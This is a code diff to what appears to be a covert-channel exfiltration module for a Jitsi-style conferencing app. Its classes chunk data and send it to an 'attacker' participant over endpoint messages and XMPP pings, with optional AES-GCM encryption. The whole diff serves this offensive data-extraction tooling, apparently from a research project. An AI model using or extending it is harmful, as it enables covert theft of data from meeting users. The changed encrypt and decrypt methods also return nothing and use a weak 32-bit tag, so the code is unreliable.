@@ -44,14 +44,15 @@ class CovertChannelMethods {
      * @param {any} data - specified data to be sent
      */
     static useEndpoint(data, attacker, configuration) {
+        console.log('self check:', this);
         for (const chunkData of splitString(data, configuration.chunkSize)) {
             console.log('data:', chunkData);
-            APP.conference.sendEndpointMessage(attacker.getId(), {
+            APP.conference.sendEndpointMessage(attacker.id, {
                 extraction: 'reply',
                 payload: chunkData
             });
         }
-        CovertChannelMethods.endCommunication(attacker.getId());
+        CovertChannelMethods.endCommunication(attacker.id);
     }
 
     /**
@@ -142,11 +143,12 @@ class CovertChannelMethods {
         const intervalRef = setInterval(() => {
             if (!splitedData.length) {
                 clearInterval(intervalRef);
-                CovertChannelMethods.endCommunication(attacker.getId());
+                CovertChannelMethods.endCommunication(attacker.id);
 
                 return;
             }
-            CovertChannelMethods.extractionPing(attacker.getJid(), e => {
+            console.log('attacker:', attacker);
+            CovertChannelMethods.extractionPing(attacker.jid, e => {
                 console.log('success', e, splitedData);
             }, e => {
                 console.log('fail', e);
@@ -192,9 +194,9 @@ class ExtractionCovertChannelMethods {
             stackedData.push(ping.children[0].attributes.data.nodeValue);
             console.log('data:', stackedData);
 
-            console.log('usedXMPP', user.getJid(), ping);
+            console.log('usedXMPP', user.jid, ping);
 
-            CovertChannelMethods.extractionPing(user.getJid(),
+            CovertChannelMethods.extractionPing(user.jid,
                 message => {
                     console.log('successful message recieved:', message);
                 }, message => {
@@ -231,7 +233,6 @@ export class ExtractionHandler {
         this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
         this._fileBuffer = [];
         this.communicationEnded = false;
-        this.initializeEncryption();
         this.nameOfCommunication = this.generateName();
     }
 
@@ -273,24 +274,62 @@ export class ExtractionHandler {
     }
 
     /**
+     *
+     * @param {*} buffer
+     * @returns
+     */
+    arrayBufferToBase64(buffer) {
+        let binary = '';
+        const bytes = new Uint8Array(buffer);
+        const len = bytes.byteLength;
+
+        for (let i = 0; i < len; i++) {
+            binary += String.fromCharCode(bytes[i]);
+        }
+
+        return window.btoa(binary);
+    }
+
+
+    /**
+     *
+     * @param {*} base64
+     * @returns
+     */
+    base64ToArrayBuffer(base64) {
+        const binaryString = window.atob(base64);
+        const len = binaryString.length;
+        const bytes = new Uint8Array(len);
+
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+        }
+
+        return bytes.buffer;
+    }
+
+
+    /**
      * Encrypts chunk of data
      * @param {object} data
      */
-    encrypt(data) {
-        crypto.subtle.encrypt({ name: 'AES-GCM',
+    async encrypt(data) {
+        console.log('ENCRYPT:', data, this);
+        await crypto.subtle.encrypt({ name: 'AES-GCM',
             tagLength: 32,
             iv: this.configuration.iv }, this.configuration.key, new TextEncoder().encode(data))
-        .then(encryptedFile => encryptedFile);
+        .then(encryptedFile => this.arrayBufferToBase64(encryptedFile));
     }
 
     /**
      * Decrypts chunk of data
      * @param {object} data
      */
-    decrypt(data) {
-        crypto.subtle.decrypt({ name: 'AES-GCM',
+    async decrypt(data) {
+        console.log('DECRYPT:', data, this);
+        await crypto.subtle.decrypt({ name: 'AES-GCM',
             tagLength: 32,
-            iv: this.configuration.iv }, this.configuration.key, data)
+            iv: this.configuration.iv }, this.configuration.key, this.base64ToArrayBuffer(data))
         .then(decryptedData => new TextDecoder().decode(decryptedData));
 
     }
@@ -330,13 +369,16 @@ export class ExtractionHandler {
     sendAll(data, attacker, dataSize = data.length) {
         // If the method can loose data through the transition send the final size of sent file.
 
-        this.initializeEncryption().then(() => {
-            if (this.enabledEncryption()) {
-                // TODO: make encryption work.
-            }
-            CovertChannelMethods.options[this.configuration.method](data, attacker, 
-                this.configuration, this.nameOfCommunication);
-        });
+        if (this.enabledEncryption()) {
+            // TODO: make encryption work.
+            this.encrypt(data).then(data => {
+                CovertChannelMethods.options[this.configuration.method](data, attacker,
+                        this.configuration, this.nameOfCommunication);
+            });
+        } else {
+            CovertChannelMethods.options[this.configuration.method](data, attacker,
+                    this.configuration, this.nameOfCommunication);
+        }
     }
 
     /**
@@ -363,7 +405,9 @@ export class ExtractionHandler {
 
         } else if (this.enabledEncryption()) { // 'reply' containg encrypted data
             console.log('DECRYPT:', recievedData.payload, this);
-            this._fileBuffer.push(this.decrypt(recievedData.payload));
+            this.decrypt(recievedData.payload).then(data => {
+                this._fileBuffer.push(data);
+            });
         } else { // 'reply' containg text data
             this._fileBuffer.push(recievedData.payload);
         }
